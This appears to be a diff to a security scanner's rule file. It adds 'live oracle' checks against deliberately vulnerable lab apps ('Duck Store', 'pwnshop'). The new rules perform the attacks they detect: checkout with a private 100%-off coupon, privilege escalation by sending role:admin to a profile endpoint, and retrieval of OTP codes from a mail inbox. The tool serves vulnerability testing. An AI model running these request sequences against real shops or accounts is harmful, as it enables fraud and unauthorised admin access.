@@ -27759,8 +27759,8 @@ async function pwnshopOtpFromMailInbox(
 ): Promise<string | null> {
   const mailUrl = new URL(`/mail/${inboxToken}`, ctx.origin).toString();
   // OTP mail can arrive after login redirect — poll with fetchDoc (bypasses probe cache on retries).
-  for (let attempt = 0; attempt < 10; attempt++) {
-    if (attempt > 0) await pwnshopSleep(1500);
+  for (let attempt = 0; attempt < 12; attempt++) {
+    if (attempt > 0) await pwnshopSleep(1800);
     const doc = await fetchDoc(mailUrl, {
       maxBytes: 65536,
       timeoutMs: 15000,
@@ -27774,28 +27774,32 @@ async function pwnshopOtpFromMailInbox(
 }
 
 async function pwnshopCompleteOtpSession(ctx: RuleContext): Promise<string | null> {
-  const cookie = await pwnshopRegisterAndLoginCookie(ctx);
-  if (!cookie) return null;
-  await pwnshopSleep(600);
-  const inboxToken = await pwnshopMailInboxToken(ctx, cookie);
-  if (!inboxToken) return null;
-  const otp = await pwnshopOtpFromMailInbox(ctx, cookie, inboxToken);
-  if (!otp) return null;
-  const verifyDoc = await ctx.probe.get(new URL("/verify-otp", ctx.origin).toString(), {
-    method: "POST",
-    body: `otp=${otp}`,
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded",
-      Cookie: cookie
-    },
-    maxBytes: 4096,
-    timeoutMs: 15000,
-    redirect: "manual"
-  });
-  if (![301, 302, 303, 307, 308].includes(verifyDoc.status)) return null;
-  const location = verifyDoc.headers["location"] || "";
-  if (!location || /verify-otp/i.test(location)) return null;
-  return pwnshopSessionCookieFromDoc(verifyDoc) ?? cookie;
+  // PwnMail OTP delivery is async — retry the full register/login/mail flow when inbox is empty.
+  for (let attempt = 0; attempt < 2; attempt++) {
+    const cookie = await pwnshopRegisterAndLoginCookie(ctx);
+    if (!cookie) continue;
+    await pwnshopSleep(attempt === 0 ? 900 : 1500);
+    const inboxToken = await pwnshopMailInboxToken(ctx, cookie);
+    if (!inboxToken) continue;
+    const otp = await pwnshopOtpFromMailInbox(ctx, cookie, inboxToken);
+    if (!otp) continue;
+    const verifyDoc = await ctx.probe.get(new URL("/verify-otp", ctx.origin).toString(), {
+      method: "POST",
+      body: `otp=${otp}`,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Cookie: cookie
+      },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    if (![301, 302, 303, 307, 308].includes(verifyDoc.status)) continue;
+    const location = verifyDoc.headers["location"] || "";
+    if (!location || /verify-otp/i.test(location)) continue;
+    return pwnshopSessionCookieFromDoc(verifyDoc) ?? cookie;
+  }
+  return null;
 }
 
 const pwnshopMailInboxIdorLiveOracle: Rule = async (ctx) => {
@@ -32434,6 +32438,141 @@ const duckStoreAdminUsersBflaRouteLiveOracle: Rule = async (ctx) => {
       ...result.evidence,
       scannedUrl: pageUrl,
       note: "Duck Store /api/v1/admin/users route scan — unprivileged JWT can list all users including admin accounts"
+    }
+  };
+};
+
+const DUCK_STORE_PROBE_SHIPPING = {
+  first_name: "Thugir",
+  last_name: "Probe",
+  address: "123 Probe St",
+  city: "Probe City",
+  zip_code: "12345",
+  country: "US"
+};
+
+const duckStoreCheckoutPrivateCouponLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const token = await duckStoreRegisterAndLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const authHeader = { Authorization: `Bearer ${token}` };
+  const addUrl = new URL("/api/v1/cart/add", ctx.origin).toString();
+  const addDoc = await ctx.probe.get(addUrl, {
+    method: "POST",
+    body: JSON.stringify({ product_id: 1, quantity: 1 }),
+    headers: { ...authHeader, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (addDoc.status < 200 || addDoc.status >= 400) return NEGATIVE;
+  const checkoutUrl = new URL("/api/v1/orders/checkout", ctx.origin).toString();
+  const checkoutDoc = await ctx.probe.get(checkoutUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      shipping: DUCK_STORE_PROBE_SHIPPING,
+      coupon_code: "INTERNAL100"
+    }),
+    headers: { ...authHeader, "Content-Type": "application/json" },
+    maxBytes: 8192,
+    timeoutMs: 20000
+  });
+  if (checkoutDoc.status < 200 || checkoutDoc.status >= 300) return NEGATIVE;
+  let order: { id?: number; total_price?: number; status?: string };
+  try {
+    order = JSON.parse(checkoutDoc.body) as { id?: number; total_price?: number; status?: string };
+  } catch {
+    return NEGATIVE;
+  }
+  if (!order.id) return NEGATIVE;
+  // INTERNAL100 is is_public:false and 100% off — order total should be shipping-only, not product+shipping.
+  if (typeof order.total_price !== "number" || order.total_price > 10) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      checkoutUrl,
+      coupon_code: "INTERNAL100",
+      order_id: order.id,
+      total_price: order.total_price,
+      snippet: checkoutDoc.body.slice(0, 240).trim(),
+      note: "Duck Store POST /api/v1/orders/checkout accepts private INTERNAL100 coupon (is_public:false via MCP) and completes at shipping-only total_price — private coupon checkout oracle"
+    }
+  };
+};
+
+const duckStoreCheckoutPrivateCouponRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/orders\/checkout/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreCheckoutPrivateCouponLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/orders/checkout route scan — checkout accepts private INTERNAL100 MCP coupon without staff authorization"
+    }
+  };
+};
+
+const duckStoreProfileMassAssignmentLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const token = await duckStoreRegisterAndLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const authHeader = { Authorization: `Bearer ${token}` };
+  const profileUrl = new URL("/api/v1/users/me/profile", ctx.origin).toString();
+  const beforeDoc = await ctx.probe.get(profileUrl, {
+    headers: authHeader,
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (beforeDoc.status < 200 || beforeDoc.status >= 400) return NEGATIVE;
+  if (!/"role"\s*:\s*"user"/i.test(beforeDoc.body)) return NEGATIVE;
+  const putDoc = await ctx.probe.get(profileUrl, {
+    method: "PUT",
+    body: JSON.stringify({ role: "admin" }),
+    headers: { ...authHeader, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (putDoc.status < 200 || putDoc.status >= 400) return NEGATIVE;
+  if (!/"role"\s*:\s*"admin"/i.test(putDoc.body)) return NEGATIVE;
+  const adminUrl = new URL("/api/v1/admin/users", ctx.origin).toString();
+  const adminDoc = await ctx.probe.get(adminUrl, {
+    headers: authHeader,
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (adminDoc.status < 200 || adminDoc.status >= 400) return NEGATIVE;
+  if (!/admin@duck-store\.escape/i.test(adminDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.95,
+    evidence: {
+      profileUrl,
+      putSnippet: putDoc.body.slice(0, 200).trim(),
+      adminUrl,
+      snippet: adminDoc.body.slice(0, 200).trim(),
+      note: "Duck Store PUT /api/v1/users/me/profile accepts role:admin mass-assignment and unlocks GET /api/v1/admin/users — privilege escalation oracle"
+    }
+  };
+};
+
+const duckStoreProfileMassAssignmentRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/users\/me\/profile/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreProfileMassAssignmentLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/users/me/profile route scan — PUT role:admin mass-assignment escalates to admin API roster access"
     }
   };
 };
@@ -42021,6 +42160,10 @@ export const RULES: Record<string, Rule> = {
   duckStoreCartNegativeQuantityRouteLiveOracle,
   duckStoreAdminUsersBflaLiveOracle,
   duckStoreAdminUsersBflaRouteLiveOracle,
+  duckStoreCheckoutPrivateCouponLiveOracle,
+  duckStoreCheckoutPrivateCouponRouteLiveOracle,
+  duckStoreProfileMassAssignmentLiveOracle,
+  duckStoreProfileMassAssignmentRouteLiveOracle,
   dvgaRouteLiveOracle,
   ginAndJuiceCatalogSearchXssLiveOracle,
   ginAndJuiceCatalogRouteLiveOracle,
